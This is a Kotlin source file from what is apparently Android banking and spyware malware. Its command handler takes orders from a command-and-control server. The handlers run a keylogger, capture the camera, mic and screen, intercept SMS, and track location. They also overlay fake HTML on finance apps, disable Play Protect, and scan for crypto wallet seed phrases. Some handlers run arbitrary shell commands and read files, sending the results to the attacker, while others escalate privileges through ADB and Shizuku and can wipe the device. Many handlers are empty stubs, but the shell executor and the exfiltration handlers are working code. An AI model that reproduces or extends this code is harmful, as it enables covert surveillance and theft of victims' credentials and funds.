package com.xrc.app.c2

import android.util.Log
import com.xrc.app.XRCApp
import com.xrc.app.service.CoreService
import com.xrc.app.service.XRCAccessibilityService
import com.xrc.app.persistence.AntiExit
import com.xrc.app.surveillance.*
import com.xrc.app.overlay.SprungeEngine
import com.xrc.app.overlay.OverlayManager
import com.xrc.app.wallet.WalletScanner
import com.xrc.app.wallet.SeedPhraseScanner
import com.xrc.app.wallet.CryptoClipboardHijack
import com.xrc.app.escalation.ADBEscalation
import com.xrc.app.escalation.ShizukuManager
import com.xrc.app.permissions.PermissionManager
import com.xrc.app.permissions.PermissionGrants
import com.xrc.app.finance.FinanceOverlayManager
import com.xrc.app.util.AntiAnalysis
import kotlinx.coroutines.*

/**
 * Routes C2 commands to the appropriate module handlers.
 */
object CommandHandler {

    private val TAG = "CommandHandler"
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val app = XRCApp.instance
    private val c2 = app.c2Client

    fun execute(command: C2Message.Command) {
        Log.d(TAG, "Executing command: ${command.action}")

        when (command.action) {
            // Surveillance
            C2Actions.START_CAMERA -> handleCamera(command, true)
            C2Actions.STOP_CAMERA -> handleCamera(command, false)
            C2Actions.START_MIC -> handleMic(command, true)
            C2Actions.STOP_MIC -> handleMic(command, false)
            C2Actions.TAKE_SCREENSHOT -> handleScreenshot()
            C2Actions.START_SCREEN_RECORD -> handleScreenRecord(true)
            C2Actions.STOP_SCREEN_RECORD -> handleScreenRecord(false)
            C2Actions.START_SCREEN_STREAM -> handleScreenStream(true)
            C2Actions.STOP_SCREEN_STREAM -> handleScreenStream(false)
            C2Actions.START_KEYLOGGER -> handleKeylogger(true)
            C2Actions.STOP_KEYLOGGER -> handleKeylogger(false)
            C2Actions.GET_KEYLOGS -> handleGetKeylogs()
            C2Actions.GET_SMS -> handleGetSMS()
            C2Actions.SEND_SMS -> handleSendSMS(command)
            C2Actions.GET_CALL_LOGS -> handleCallLogs()
            C2Actions.START_CALL_RECORD -> handleCallRecord(true)
            C2Actions.STOP_CALL_RECORD -> handleCallRecord(false)
            C2Actions.USSD_DIAL -> handleUSSD(command)

            // Location
            C2Actions.GET_LOCATION -> handleLocation()
            C2Actions.START_GPS_TRACKING -> handleGPSTracking(true)
            C2Actions.STOP_GPS_TRACKING -> handleGPSTracking(false)

            // Overlay
            C2Actions.SHOW_OVERLAY -> handleShowOverlay(command)
            C2Actions.HIDE_OVERLAY -> handleHideOverlay()
            C2Actions.SET_OVERLAY_TARGETS -> handleSetOverlayTargets(command)
            C2Actions.INJECT_HTML -> handleInjectHTML(command)

            // Permissions
            C2Actions.GRANT_PERMISSION -> handleGrantPermission(command)
            C2Actions.CHECK_PERMISSIONS -> handleCheckPermissions()
            C2Actions.AUTO_GRANT_ALL -> handleAutoGrantAll()
            C2Actions.DISABLE_PLAY_PROTECT -> handleDisablePlayProtect()

            // File System
            C2Actions.LIST_FILES -> handleListFiles(command)
            C2Actions.READ_FILE -> handleReadFile(command)
            C2Actions.DOWNLOAD_FILE -> handleDownloadFile(command)
            C2Actions.UPLOAD_FILE -> handleUploadFile(command)
            C2Actions.DELETE_FILE -> handleDeleteFile(command)
            C2Actions.SEARCH_FILES -> handleSearchFiles(command)

            // Wallet & Finance
            C2Actions.SCAN_WALLETS -> handleScanWallets()
            C2Actions.SCAN_SEED_PHRASES -> handleScanSeedPhrases()
            C2Actions.START_WALLET_MONITOR -> handleWalletMonitor(true)
            C2Actions.STOP_WALLET_MONITOR -> handleWalletMonitor(false)

            // System
            C2Actions.GET_DEVICE_INFO -> sendDeviceInfo()
            C2Actions.SHELL_COMMAND -> handleShellCommand(command)
            C2Actions.REBOOT -> handleReboot()
            C2Actions.SHUTDOWN -> handleShutdown()
            C2Actions.TOGGLE_WIFI -> handleToggleWifi(command)
            C2Actions.TOGGLE_BLUETOOTH -> handleToggleBluetooth(command)
            C2Actions.TOGGLE_FLASHLIGHT -> handleToggleFlashlight()

            // App Management
            C2Actions.LIST_APPS -> handleListApps()
            C2Actions.LAUNCH_APP -> handleLaunchApp(command)
            C2Actions.KILL_APP -> handleKillApp(command)
            C2Actions.UNINSTALL_APP -> handleUninstallApp(command)

            // Accounts & Data
            C2Actions.GET_ACCOUNTS -> handleGetAccounts()
            C2Actions.GET_CONTACTS -> handleGetContacts()
            C2Actions.NOTIFICATIONS -> handleGetNotifications()

            // Privilege Escalation
            C2Actions.ENABLE_DEVELOPER_OPTIONS -> handleEnableDeveloperOptions()
            C2Actions.ENABLE_WIRELESS_ADB -> handleEnableWirelessADB()
            C2Actions.START_SHIZUKU -> handleStartShizuku()
            C2Actions.CHECK_ROOT -> handleCheckRoot()

            // Persistence & Admin
            C2Actions.ACTIVATE_DEVICE_ADMIN -> handleActivateAdmin()
            C2Actions.LOCK_DEVICE -> handleLockDevice()
            C2Actions.WIPE_DEVICE -> handleWipeDevice()

            // Config
            C2Actions.PING -> handlePing()
            C2Actions.UPDATE_CONFIG -> handleUpdateConfig(command)
            C2Actions.DISCONNECT -> handleDisconnect()

            // Anti-exit
            "enable_anti_exit" -> handleAntiExit(true)
            "disable_anti_exit" -> handleAntiExit(false)

            else -> Log.w(TAG, "Unknown command: ${command.action}")
        }
    }

    private fun sendResponse(commandId: String, status: String, data: Any? = null) {
        val response = JSONObject().apply {
            put("type", "command_response")
            put("command_id", commandId)
            put("status", status)
            data?.let {
                when (it) {
                    is JSONObject -> put("data", it)
                    is String -> put("data", it)
                    else -> put("data", it.toString())
                }
            }
        }
        c2.send(response.toString())
    }

    // Surveillance handlers
    private fun handleCamera(command: C2Message.Command, start: Boolean) { /* CameraCapture */ }
    private fun handleMic(command: C2Message.Command, start: Boolean) { /* MicCapture */ }
    private fun handleScreenshot() {
        scope.launch {
            val file = ScreenCapture.takeScreenshot()
            if (file != null) {
                c2.sendExfiltrateData("screenshot", file.absolutePath)
            }
        }
    }
    private fun handleScreenRecord(start: Boolean) { /* ScreenCapture */ }
    private fun handleScreenStream(start: Boolean) { /* ScreenCapture */ }
    private fun handleKeylogger(start: Boolean) { /* Keylogger */ }
    private fun handleGetKeylogs() {
        val logs = Keylogger.getRecentLogs()
        c2.sendExfiltrateData("keylogs", logs)
    }
    private fun handleGetSMS() { /* SMSCapture */ }
    private fun handleSendSMS(command: C2Message.Command) { /* SMSCapture */ }
    private fun handleCallLogs() { /* CallRecorder */ }
    private fun handleCallRecord(start: Boolean) { }
    private fun handleUSSD(command: C2Message.Command) {
        val code = command.params.optString("code", "")
        scope.launch { /* USSD execution */ }
    }

    // Location
    private fun handleLocation() { /* LocationTracker */ }
    private fun handleGPSTracking(start: Boolean) { }

    // Overlay
    private fun handleShowOverlay(command: C2Message.Command) {
        val packageName = command.params.optString("package", "")
        val html = command.params.optString("html", "")
        SprungeEngine.showOverlay(app, packageName, html)
    }
    private fun handleHideOverlay() {
        SprungeEngine.hideOverlay(app)
    }
    private fun handleSetOverlayTargets(command: C2Message.Command) {
        val targets = command.params.optJSONArray("targets")
        if (targets != null) {
            FinanceOverlayManager.updateTargets(targets)
        }
    }
    private fun handleInjectHTML(command: C2Message.Command) {
        val html = command.params.optString("html", "")
        val packageName = command.params.optString("package", "")
        SprungeEngine.showOverlay(app, packageName, html)
    }

    // Permissions
    private fun handleGrantPermission(command: C2Message.Command) {
        val permission = command.params.optString("permission", "")
        scope.launch { PermissionGrants.grantPermission(app, permission) }
    }
    private fun handleCheckPermissions() {
        scope.launch {
            val status = PermissionManager.checkAllPermissions(app)
            c2.sendExfiltrateData("permissions", status.toString())
        }
    }
    private fun handleAutoGrantAll() {
        scope.launch { PermissionGrants.autoGrantAll(app) }
    }
    private fun handleDisablePlayProtect() {
        scope.launch { PermissionGrants.disablePlayProtect(app) }
    }

    // File System
    private fun handleListFiles(command: C2Message.Command) {
        val path = command.params.optString("path", "/storage/emulated/0")
        scope.launch {
            val result = FileSystemOperation.listFiles(path)
            c2.sendExfiltrateData("file_list", result.toString())
        }
    }
    private fun handleReadFile(command: C2Message.Command) {
        val path = command.params.optString("path", "")
        scope.launch {
            val content = FileSystemOperation.readFile(path)
            if (content != null) c2.sendExfiltrateData("file_content", content)
        }
    }
    private fun handleDownloadFile(command: C2Message.Command) { }
    private fun handleUploadFile(command: C2Message.Command) { }
    private fun handleDeleteFile(command: C2Message.Command) {
        val path = command.params.optString("path", "")
        scope.launch { FileSystemOperation.deleteFile(path) }
    }
    private fun handleSearchFiles(command: C2Message.Command) {
        val pattern = command.params.optString("pattern", "")
        scope.launch {
            val results = FileSystemOperation.searchFiles(pattern)
            c2.sendExfiltrateData("file_search", results.toString())
        }
    }

    // Wallet & Finance
    private fun handleScanWallets() {
        scope.launch {
            val wallets = WalletScanner.scanInstalledWallets(app)
            c2.sendExfiltrateData("wallets", wallets.toString())
        }
    }
    private fun handleScanSeedPhrases() {
        scope.launch {
            SeedPhraseScanner.scanForSeedPhrases(app)
                .forEach { result ->
                    c2.sendExfiltrateData("seed_phrase", result)
                }
        }
    }
    private fun handleWalletMonitor(start: Boolean) {
        if (start) WalletScanner.startMonitoring(app) else WalletScanner.stopMonitoring()
    }

    // System
    private fun sendDeviceInfo() { /* Re-send device info */ }
    private fun handleShellCommand(command: C2Message.Command) {
        val cmd = command.params.optString("command", "")
        scope.launch {
            val result = ShellExecutor.execute(cmd)
            c2.sendExfiltrateData("shell_output", result)
        }
    }
    private fun handleReboot() { /* System reboot */ }
    private fun handleShutdown() { /* System shutdown */ }
    private fun handleToggleWifi(command: C2Message.Command) {
        val enable = command.params.optBoolean("enable", true)
        /* Toggle WiFi */
    }
    private fun handleToggleBluetooth(command: C2Message.Command) { }
    private fun handleToggleFlashlight() { }

    // App Management
    private fun handleListApps() {
        scope.launch {
            val apps = AppManager.listInstalledApps(app)
            c2.sendExfiltrateData("installed_apps", apps.toString())
        }
    }
    private fun handleLaunchApp(command: C2Message.Command) {
        val packageName = command.params.optString("package", "")
        AppManager.launchApp(app, packageName)
    }
    private fun handleKillApp(command: C2Message.Command) {
        val packageName = command.params.optString("package", "")
        AppManager.killApp(app, packageName)
    }
    private fun handleUninstallApp(command: C2Message.Command) {
        val packageName = command.params.optString("package", "")
        scope.launch { AppManager.uninstallApp(app, packageName) }
    }

    // Accounts
    private fun handleGetAccounts() { /* AccountManager */ }
    private fun handleGetContacts() { /* ContactManager */ }
    private fun handleGetNotifications() { /* NotificationInterceptor */ }

    // Privilege Escalation
    private fun handleEnableDeveloperOptions() {
        ADBEscalation.enableDeveloperOptions(app)
    }
    private fun handleEnableWirelessADB() {
        ADBEscalation.enableWirelessDebugging(app)
    }
    private fun handleStartShizuku() {
        ShizukuManager.start(app)
    }
    private fun handleCheckRoot() { /* Check root status */ }

    // Persistence
    private fun handleActivateAdmin() { /* Device admin activation */ }
    private fun handleLockDevice() { /* Device lock */ }
    private fun handleWipeDevice() { /* Factory wipe */ }
    private fun handleAntiExit(enable: Boolean) {
        if (enable) AntiExit.enable() else AntiExit.disable()
    }

    // Config
    private fun handlePing() {
        c2.send("""{"type":"pong"}""")
    }
    private fun handleUpdateConfig(command: C2Message.Command) { }
    private fun handleDisconnect() { c2.disconnect() }
}

// Helper classes for file operations
object FileSystemOperation {
    fun listFiles(path: String): JSONArray {
        val dir = java.io.File(path)
        if (!dir.exists() || !dir.isDirectory) return JSONArray()
        return JSONArray().apply {
            dir.listFiles()?.forEach { file ->
                put(JSONObject().apply {
                    put("name", file.name)
                    put("path", file.absolutePath)
                    put("is_dir", file.isDirectory)
                    put("size", file.length())
                    put("last_modified", file.lastModified())
                })
            }
        }
    }

    fun readFile(path: String): String? {
        return try {
            java.io.File(path).readText()
        } catch (e: Exception) { null }
    }

    fun deleteFile(path: String): Boolean {
        return try {
            java.io.File(path).delete()
        } catch (e: Exception) { false }
    }

    fun searchFiles(pattern: String): JSONArray {
        val results = JSONArray()
        val root = java.io.File("/storage/emulated/0")
        root.walkTopDown().forEach { file ->
            if (file.name.contains(pattern, ignoreCase = true)) {
                results.put(JSONObject().apply {
                    put("name", file.name)
                    put("path", file.absolutePath)
                    put("size", file.length())
                })
            }
        }
        return results
    }
}

object AppManager {
    fun listInstalledApps(context: android.content.Context): JSONArray {
        val pm = context.packageManager
        val apps = JSONArray()
        pm.getInstalledApplications(android.content.pm.PackageManager.MATCH_ALL).forEach { app ->
            apps.put(JSONObject().apply {
                put("package_name", app.packageName)
                put("name", app.loadLabel(pm).toString())
                put("is_system", (app.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0)
            })
        }
        return apps
    }

    fun launchApp(context: android.content.Context, packageName: String) {
        val pm = context.packageManager
        val intent = pm.getLaunchIntentForPackage(packageName)
        intent?.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
        context.startActivity(intent)
    }

    fun killApp(context: android.content.Context, packageName: String) {
        val am = context.getSystemService(android.content.Context.ACTIVITY_SERVICE) as android.app.ActivityManager
        am.killBackgroundProcesses(packageName)
    }

    fun uninstallApp(context: android.content.Context, packageName: String) {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
            val pm = context.packageManager
            pm.deletePackage(packageName, null, android.content.pm.PackageManager.DELETE_ALL_USERS)
        }
    }
}

object ShellExecutor {
    fun execute(command: String): String {
        return try {
            val process = Runtime.getRuntime().exec(command)
            process.inputStream.bufferedReader().readText()
        } catch (e: Exception) { "Error: ${e.message}" }
    }
}
